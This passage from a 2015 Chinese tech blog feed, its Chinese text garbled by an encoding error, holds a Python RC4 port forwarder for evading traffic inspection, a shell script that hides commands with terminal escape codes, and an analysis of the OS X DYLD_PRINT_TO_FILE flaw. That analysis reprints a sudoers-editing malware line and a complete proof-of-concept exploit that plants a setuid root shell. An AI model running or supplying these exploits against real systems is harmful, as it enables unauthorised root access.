self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;accepted %s&#x27;</span> % <span class="built_in">str</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>==self.lasttrans:                <span class="comment">#æ²¡æœ‰ä¸Šä¸€ä¸ªtrans</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;wait for another&#x27;</span></span><br><span class="line">            self.lasttrans=Transmiter(conn)     <span class="comment">#è®°å½•æ­¤trans</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;paired to last one&#x27;</span></span><br><span class="line">            Transmiter(conn,self.lasttrans)     <span class="comment">#æœ‰è®°å½•çš„trans,é…å¯¹</span></span><br><span class="line">            self.lasttrans=<span class="literal">None</span>                 <span class="comment">#æ¸…é™¤è®°å½•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forwarder</span>(<span class="params">asyncore.dispatcher</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.remoteaddr=remoteaddr</span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=Transmiter(conn)</span><br><span class="line">        trans_toRemote=Transmiter(self.remoteaddr,trans_Acptd)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransmiterWithCipher</span>(<span class="params">Transmiter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,cipher_obj=<span class="literal">None</span>,isEnc=<span class="literal">False</span>,transmitee=<span class="literal">None</span></span>):</span></span><br><span class="line">        Transmiter.__init__(self,socket_info,transmitee)</span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.isEnc=isEnc</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.isEnc:</span><br><span class="line">            read=self.cipher_obj.decrypt(read)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">None</span> != self.transmitee.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.transmitee.isEnc:</span><br><span class="line">                read = self.transmitee.cipher_obj.encrypt(read)</span><br><span class="line">            self.transmitee.buf_Tx +=read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForwarderWithCipher</span>(<span class="params">Forwarder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, cipher_obj=<span class="literal">None</span>,localenc=<span class="literal">False</span>,remoteenc=<span class="literal">False</span>,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.localenc=localenc</span><br><span class="line">        self.remoteenc=remoteenc</span><br><span class="line">        Forwarder.__init__(self, localaddr, remoteaddr, backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=TransmiterWithCipher(conn,self.cipher_obj,self.localenc)</span><br><span class="line">        trans_toRemote=TransmiterWithCipher(self.remoteaddr,self.cipher_obj,self.remoteenc,trans_Acptd)</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯è§„é¿æµé‡ç‰¹å¾æ‰€ä»¥æ‹¿rc4å‡‘åˆä¸€ä¸‹ï¼Œæ ¹æ®è‡ªå·±çš„è„‘æ´é¡ºæ‰‹å†™äº†ä¸ªConnectorå’ŒListenneræ²¡æœ‰æµ‹è¯•ï¼Œæ‹’ç»å¡«å‘ã€‚æœ€åé€šè¿‡å…¶ä»–è¿æ¥æ¸ é“æŠŠè„šæœ¬éƒ¨åˆ°vpsåå‘ç°ç›´è¿è¿˜æ˜¯ä¼šresetï¼Œä¼°è®¡æ˜¯æ ¡é•¿å¹¶æ²¡æœ‰çœ‹æµé‡ç‰¹å¾ç›´æ¥æŠŠvpsçš„Cæ®µéƒ½æ–­äº†ã€‚ (ï¿£ã¸ï¿£)<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2FzeW5jb3JlLmh0bWw=" title="https://docs.python.org/2/library/asyncore.html">ref<i class="fa fa-external-link"></i></span></p><p>å‘ç°äº†ä¸ªå°å·¥å…·ï¼Œsocatï¼ŒåŠŸèƒ½æŒºå¤šã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘Digital Oceançš„VPSç›´è¿ä¸€ç›´è¿ä¸ä¸Šï¼Œæ€€ç–‘æ˜¯åŠŸå¤«ç‹æ ¹æ®sshçš„æµé‡ç‰¹å¾åšäº†æ‹¦æˆªï¼Œé‚å†™äº†ä¸ªè„šæœ¬å®ç°RC4åŠ å¯†çš„ç«¯å£è½¬å‘(ä¸»è¦ç›®çš„æ˜¯è§„é¿æµé‡ç‰¹å¾çš„åˆ†æ)ã€‚&lt;br&gt;pythonçš„asyncoreåº“æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„socketé€šä¿¡åº“ã€‚&lt;br&gt;ä¸€ä¸ªç®€å•çš„ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="python" scheme="https://badb100d.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>A shell trick</title>
    <link href="https://badb100d.com/2015/09/30/2015-09-30/"/>
    <id>https://badb100d.com/2015/09/30/2015-09-30/</id>
    <published>2015-09-30T10:09:00.000Z</published>
    <updated>2015-09-30T10:09:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç ç˜Ÿç»™æˆ‘å‘äº†ä¸ªå¥½ç©çš„ä¸œè¥¿</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho doing something very nice!\n&#x27; &gt;backdoor.sh</span><br><span class="line">chmod +x backdoor.sh</span><br><span class="line">cat backdoor.sh</span><br><span class="line">./backdoor.sh</span><br></pre></td></tr></table></figure><p>man ascii æŸ¥äº†ä¸‹\033æ˜¯ESCï¼Œç†è®ºä¸Šé€šè¿‡è¿™ç§æ§åˆ¶ç¬¦èƒ½ç©å‡ºå¾ˆå¤šèŠ±æ ·ã€‚<br><span class="exturl" data-url="aHR0cHM6Ly96b3JrLm5ldC9+c3Qvam90dGluZ3MvTm90ZXNfb25fVGVybWluYWxfRW11bGF0aW9uLmh0bWw=" title="https://zork.net/~st/jottings/Notes_on_Terminal_Emulation.html">ç›¸å…³é“¾æ¥<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç ç˜Ÿç»™æˆ‘å‘äº†ä¸ªå¥½ç©çš„ä¸œè¥¿&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="pentest" scheme="https://badb100d.com/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX yosemiteæœ¬åœ°ææƒæ¼æ´</title>
    <link href="https://badb100d.com/2015/08/07/2015-08-07/"/>
    <id>https://badb100d.com/2015/08/07/2015-08-07/</id>
    <published>2015-08-07T10:08:00.000Z</published>
    <updated>2015-08-07T10:08:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨æ™šåœ¨<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">freebuf<i class="fa fa-external-link"></i></span>ä¸Šçœ‹åˆ°ä¸€ç¯‡macä¸‹æ¶æ„è½¯ä»¶çš„åˆ†ææ–‡ç« ï¼Œè½¯ä»¶åˆ©ç”¨å‰æ®µæ—¶é—´æœ‰æŠ¥é“è¿‡çš„<strong>DYLD_PRINT_TO_FILE</strong>ç¯å¢ƒå˜é‡æ¥å®ç°æœ¬åœ°ææƒå…å¯†ç rootå®‰è£…ã€‚<br>è„šæœ¬æ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo -s dosomethingroot</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWw=" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html">DYLD<i class="fa fa-external-link"></i></span>å…¨ç§°dynamic link editorï¼Œå¬åå­—æ˜¯å®ç°ç±»ä¼¼åŠ¨æ€é“¾æ¥åº“åŠ è½½çš„ä¸œè¥¿ï¼Œ<strong>DYLD_PRINT_TO_FILE</strong>æ˜¯è‹¹æœåœ¨OSX 10.10åŠ å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å®ç°å°†dyldè¿›ç¨‹çš„é”™è¯¯æ—¥å¿—é‡å®šå‘åˆ°æ­¤ç¯å¢ƒå˜é‡æŒ‡å®šçš„å¯å†™æ–‡ä»¶ã€‚ä¸è¿‡æ·»åŠ è¿™ä¸ªç‰¹æ€§çš„æ—¶å€™è²Œä¼¼æ²¡æŠŠå®ƒåŠ åœ¨æœ‰å®‰å…¨éªŒè¯çš„ä»£ç èŒƒå›´å†…è€Œæ˜¯ç›´æ¥å†™åœ¨dyldçš„mainé‡Œäº†ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¤§è‡´æ·»åŠ çš„ä»£ç </span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­æ¥çœ‹dyldæ˜¯ç›´æ¥ä»ç¯å¢ƒå˜é‡ä¸­è·å–<strong>DYLD_PRINT_TO_FILE</strong>çš„å€¼ä½œä¸ºæ–‡ä»¶è·¯å¾„å¹¶appendå†™æ‰“å¼€æ–‡ä»¶ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ã€‚ã€‚ã€‚<br>æ™®é€šç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸ªå˜é‡åœ¨ç³»ç»Ÿç›®å½•åˆ›å»ºæ–‡ä»¶ï¼Œæˆ–å¦‚å‰é¢çš„æ¶æ„è½¯ä»¶é‚£æ ·ä¿®æ”¹rootçš„é…ç½®æ–‡ä»¶ï¼Œæˆ–ä¿®æ”¹SUIDçš„binæ–‡ä»¶ã€‚<br>æ›´ä¸¥é‡çš„æ˜¯è¿™ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦å¹¶æ²¡æœ‰è¢«å…³é—­ï¼Œç‰¹æƒçˆ¶è¿›ç¨‹forkå‡ºçš„å­è¿›ç¨‹éƒ½å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚<br>äº†è§£äº†åŸç†å†çœ‹æ¶æ„è½¯ä»¶çš„ä»£ç ï¼Œè„šæœ¬é¦–å…ˆè®¾ç½®ç¯å¢ƒå˜é‡DYLD_PRINT_TO_FILEï¼Œå†å¯åŠ¨newgrpè¿™ä¸ªSUIDæ–‡ä»¶æ¥æ‰§è¡Œecho â€œstringâ€ &gt; &amp;3çš„æ“ä½œï¼Œæ­¤æ—¶3é€šè¿‡<strong>DYLD_PRINT_TO_FILE</strong>åˆ†é…ç»™äº†sudoersæ–‡ä»¶ï¼Œæ‰€ä»¥ç»“æœå°±æ˜¯åœ¨sudoersçš„å°¾éƒ¨æ·»åŠ äº†ä¸€è¡Œé’ˆå¯¹å½“å‰è´¦æˆ·çš„é…ç½®ï¼Œè„šæœ¬å†å»æ‰§è¡Œsudo -s commandå°±æ²¡æœ‰æç¤ºäº†ã€‚<br>googleäº†ä¸€ç•ªçœ‹äº†äº›æ­ªæœä»å†™çš„å¸–å­ï¼Œä»¥ä¸‹ä¸ºä¸¤ä¸ªå…³äºæ­¤æ¼æ´çš„pocè„šæœ¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  EDITOR=/usr/bin/<span class="literal">true</span> DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpocç”¨çš„æ˜¯suidçš„crontabä½œloader</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç²¾å½©çš„poc</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE</span></span><br><span class="line"><span class="comment"># local privilege escalation vulnerability in OS X 10.10 - 10.10.4</span></span><br><span class="line"><span class="comment"># (C) Copyright 2015 Stefan Esser &lt;stefan.esser@sektioneins.de&gt;</span></span><br><span class="line"><span class="comment"># Wait months for a fix from Apple or install the following KEXT as protection</span></span><br><span class="line"><span class="comment"># https://github.com/sektioneins/SUIDGuard</span></span><br><span class="line"><span class="comment"># Use at your own risk. This copies files around with root permissions,</span></span><br><span class="line"><span class="comment"># overwrites them and deletes them afterwards. Any glitch could corrupt your</span></span><br><span class="line"><span class="comment"># system. So you have been warned.</span></span><br><span class="line">SUIDVICTIM=/usr/bin/newgrp</span><br><span class="line"><span class="comment"># why even try to prevent a race condition?</span></span><br><span class="line">TARGET=`<span class="built_in">pwd</span>`/tmpXXXXX</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">mkdir <span class="variable">$TARGET</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/boomsh.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">        setuid(0);</span></span><br><span class="line"><span class="string">        setgid(0);</span></span><br><span class="line"><span class="string">        system(&quot;/bin/bash -i&quot;);</span></span><br><span class="line"><span class="string">        printf(&quot;done.\n&quot;);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(int argc, char **argv)&#123;</span></span><br><span class="line"><span class="string">        int fd;</span></span><br><span class="line"><span class="string">        char buffer[1024];</span></span><br><span class="line"><span class="string">        ssize_t toread, numread;</span></span><br><span class="line"><span class="string">        ssize_t numwritten;</span></span><br><span class="line"><span class="string">        ssize_t size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* disable O_APPEND */</span></span><br><span class="line"><span class="string">        fcntl(3, F_SETFL, 0);</span></span><br><span class="line"><span class="string">        lseek(3, 0, SEEK_SET);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write file into it */</span></span><br><span class="line"><span class="string">        fd = open(</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;<span class="variable">$TARGET</span>/boomsh\&quot;&quot;</span> &gt;&gt; <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt;&gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">        , O_RDONLY, 0);</span></span><br><span class="line"><span class="string">        if (fd &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                /* determine size */</span></span><br><span class="line"><span class="string">                size = lseek(fd, 0, SEEK_END);</span></span><br><span class="line"><span class="string">                lseek(fd, 0, SEEK_SET);</span></span><br><span class="line"><span class="string">                while (size &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                        if (size &gt; sizeof(buffer)) &#123;</span></span><br><span class="line"><span class="string">                                toread = sizeof(buffer);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                                toread = size;</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numread = read(fd, &amp;buffer, toread);</span></span><br><span class="line"><span class="string">                        if (numread &lt; toread) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem reading\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numwritten = write(3, &amp;buffer, numread);</span></span><br><span class="line"><span class="string">                        if (numread != numwritten) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem writing\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        size -= numwritten;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                fsync(3);</span></span><br><span class="line"><span class="string">                close(fd);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;Cannot open for reading\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cp <span class="variable">$SUIDVICTIM</span> <span class="variable">$TARGET</span>/backup</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/overwrite <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/boomsh <span class="variable">$TARGET</span>/boomsh.c</span><br><span class="line">EDITOR=<span class="variable">$TARGET</span>/overwrite DYLD_PRINT_TO_FILE=<span class="variable">$SUIDVICTIM</span> crontab -e 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh &quot;</span> | <span class="variable">$SUIDVICTIM</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/backup <span class="variable">$SUIDVICTIM</span>&quot;</span> | /usr/bin/boomsh &gt; /dev/null 2&gt; /dev/null</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">/usr/bin/boomsh</span><br></pre></td></tr></table></figure><p>è¿™é£éªšçš„bashå§¿åŠ¿ä¹Ÿæ˜¯è®©äººå¤§å¼€çœ¼ç•Œï¼Œæ­ªæœä»çœŸä¼šç©ã€‚<br>è„šæœ¬ç”Ÿæˆäº†ä¸¤ä¸ªcï¼Œç¬¬ä¸€ä¸ªæ¯”è¾ƒç®€å•ï¼Œå…ˆè®¾ç½®ç”¨æˆ·å’Œç»„åˆ°rootï¼Œå†è°ƒç”¨bashï¼›ç¬¬äºŒä¸ªæŠŠç¬¬ä¸€ä¸ªç”Ÿæˆçš„äºŒè¿›åˆ¶è¯»å‡ºæ¥å†å†™åˆ°æ–‡ä»¶æµ3(DYLD_PRINT_TO_FILE)é‡Œã€‚<br>ä¹‹åè„šæœ¬æŠŠnewgrp(host suid)æ‹·åˆ°ä¸´æ—¶æ–‡ä»¶ï¼Œç¼–è¯‘ä¸¤ä¸ªcï¼Œé€šè¿‡crontab(loader suid)è·å¾—é«˜æƒé™çš„3æ–‡ä»¶æè¿°ç¬¦(å†™åˆ°host suid)ï¼Œcrontabè°ƒç”¨EDITORæŠŠboomshå†™åˆ°3(ä¸è¦æ±‚ç‰¹æƒ)ï¼Œç„¶åè°ƒç”¨è¢«ä¿®æ”¹äº†çš„newgrp(host suid)å®‰è£…boomshå¹¶è®¾ç½®boomshçš„suidï¼Œå†è°ƒç”¨å®‰è£…å¥½çš„boomshè¿˜åŸnewgrpï¼Œåˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œæ‰§è¡Œboomshã€‚</p><p>è¿™é‡Œéœ€è¦æä¸€ç‚¹ï¼Œè™½ç„¶writeçš„manualä¸­è¯´éç‰¹æƒè´¦æˆ·writeå¸¦suidçš„binæ—¶ä¼šå»é™¤binçš„suidï¼Œä½†å¾—ç›ŠäºDYLD_PRINT_TO_FILEï¼Œloader suidè¿›ç¨‹ä»¥rootæ‰“å¼€äº†å¸¦suidçš„host binï¼Œæ–‡ä»¶æè¿°ç¬¦ç»§æ‰¿äº†rootçº§åˆ«çš„ç‰¹æƒï¼Œæ‰€ä»¥å¯¹æè¿°ç¬¦çš„æ“ä½œä¼šè¢«è®¤ä¸ºæ˜¯rootçº§çš„ï¼Œæ‰€ä»¥æ²¡æœ‰è§¦å‘manualä¸­è¯´çš„å¯¹writeçš„é™åˆ¶ï¼Œå…·ä½“çš„ç»†èŠ‚åº”è¯¥ç±»ä¼¼äºwinä¸‹æ–‡ä»¶çš„contextä¹‹ç±»çš„å§ã€‚</p><p>å¼€å‘äººå‘˜çš„å®‰å…¨æ„è¯†æœ‰å¾…æé«˜å•Šã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VrdGlvbmVpbnMuZGUvZW4vYmxvZy8xNS0wNy0wNy1keWxkX3ByaW50X3RvX2ZpbGVfbHBlLmh0bWw=" title="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">å‚è€ƒé“¾æ¥<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨æ™šåœ¨&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=&quot; title=&quot;http://www.freebuf.com/news/74180.html&quot;&gt;freebuf&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;ä¸Šçœ‹åˆ°ä¸€ç¯‡macä¸‹æ¶æ„è½¯ä»¶çš„åˆ†ææ–‡ç« ï¼Œè½¯ä»¶åˆ©ç”¨å‰æ®µæ—¶é—´æœ‰æŠ¥é“è¿‡çš„&lt;strong&gt;DYLD_PRINT_TO_FILE&lt;/strong&gt;ç¯å¢ƒå˜é‡æ¥å®ç°æœ¬åœ°ææƒå…å¯†ç rootå®‰è£…ã€‚&lt;br&gt;è„šæœ¬æ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="osx" scheme="https://badb100d.com/tags/osx/"/>
    
      <category term="macos" scheme="https://badb100d.com/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>å¯¹ä»˜ä»¥å‡å·å¼€å¤´çš„æ–‡ä»¶</title>
    <link href="https://badb100d.com/2015/07/22/2015-07-22/"/>
    <id>https://badb100d.com/2015/07/22/2015-07-22/</id>
    <published>2015-07-22T06:22:00.000Z</published>
    <updated>2015-07-22T06:22:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>linuxä¸‹ä¸å°å¿ƒæŠŠæ–‡ä»¶å¼„æˆ  -sth  çš„æ–‡ä»¶åäº†ã€‚ã€‚ã€‚<br>ä¸Šç½‘æŸ¥äº†æŸ¥å‘ç°ä¸¤ç§ç®€å•çš„æ–¹æ³•ï¼š<br>eg:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  --  -sth  sth</span><br></pre></td></tr></table></figure><p>æˆ–è€…æœºæ™ºçš„ç”¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  ./-sth  sth</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
